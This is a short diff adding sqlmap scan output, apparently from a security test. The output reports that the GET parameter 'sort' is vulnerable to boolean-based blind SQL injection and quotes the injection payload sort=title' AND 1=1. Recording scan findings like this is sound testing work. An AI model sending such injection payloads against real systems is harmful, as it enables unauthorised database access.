@@ -1,0 +1,8 @@
+sqlmap identified the following injection point(s) with a total of 120 HTTP(s) requests:
+---
+Parameter: sort (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: sort=title' AND 1=1
+GET parameter 'sort' is vulnerable.
+---
